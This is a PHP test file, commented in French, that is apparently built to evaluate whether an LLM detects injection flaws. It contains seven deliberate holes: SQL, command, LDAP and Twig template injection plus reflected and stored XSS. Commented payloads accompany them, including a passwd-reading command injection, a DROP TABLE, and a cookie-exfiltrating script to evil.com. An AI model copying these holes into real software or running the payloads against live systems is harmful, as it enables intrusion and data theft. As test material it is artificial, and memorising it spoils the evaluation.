<?php
/**
 * FICHIER DE TEST — VULNÉRABILITÉS INTENTIONNELLES
 * Usage : évaluation LLM — détection OWASP A03:2021 Injection
 * NE PAS déployer en production.
 */

$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'root');

// ─── Faille 1 : SQL Injection classique ──────────────────────────────────────────
// Payload : ' OR '1'='1' --
function searchUsers(string $name): array {
    global $pdo;
    $query = "SELECT * FROM users WHERE name = '$name'";
    return $pdo->query($query)->fetchAll(); // concaténation directe
}

// ─── Faille 2 : SQL Injection dans ORDER BY (non paramétrable via PDO) ───────────
// Payload : id; DROP TABLE users --
$order = $_GET['sort'] ?? 'id';
$stmt = $pdo->query("SELECT * FROM products ORDER BY $order");

// ─── Faille 3 : Command Injection ────────────────────────────────────────────────
// Payload : 127.0.0.1; cat /etc/passwd
function ping(string $host): string {
    $output = shell_exec("ping -c 1 " . $host);
    return $output;
}
echo ping($_GET['host']);

// ─── Faille 4 : XSS Réfléchi ─────────────────────────────────────────────────────
// Payload : <script>document.location='https://evil.com/?c='+document.cookie</script>
$search = $_GET['q'] ?? '';
echo "<p>Résultats pour : $search</p>"; // pas d'htmlspecialchars

// ─── Faille 5 : XSS Persistant ───────────────────────────────────────────────────
function saveComment(PDO $pdo, string $comment): void {
    // stocke du HTML/JS non filtré
    $pdo->exec("INSERT INTO comments (body) VALUES ('$comment')");
}

function displayComments(PDO $pdo): void {
    $comments = $pdo->query("SELECT body FROM comments")->fetchAll();
    foreach ($comments as $c) {
        echo "<div>" . $c['body'] . "</div>"; // réinjection directe
    }
}

// ─── Faille 6 : LDAP Injection ───────────────────────────────────────────────────
function ldapLogin(string $user, string $pass): bool {
    $conn = ldap_connect("ldap://ldap.example.com");
    $filter = "(&(uid=$user)(userPassword=$pass))"; // pas d'échappement ldap_escape
    $result = ldap_search($conn, "dc=example,dc=com", $filter);
    return ldap_count_entries($conn, $result) > 0;
}

// ─── Faille 7 : Template Injection (Twig en mode non-sandbox) ────────────────────
function renderTemplate(string $userInput): string {
    $loader   = new \Twig\Loader\ArrayLoader(['template' => $userInput]);
    $twig     = new \Twig\Environment($loader); // sandbox désactivé
    return $twig->render('template', []);
    // Payload : {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
}
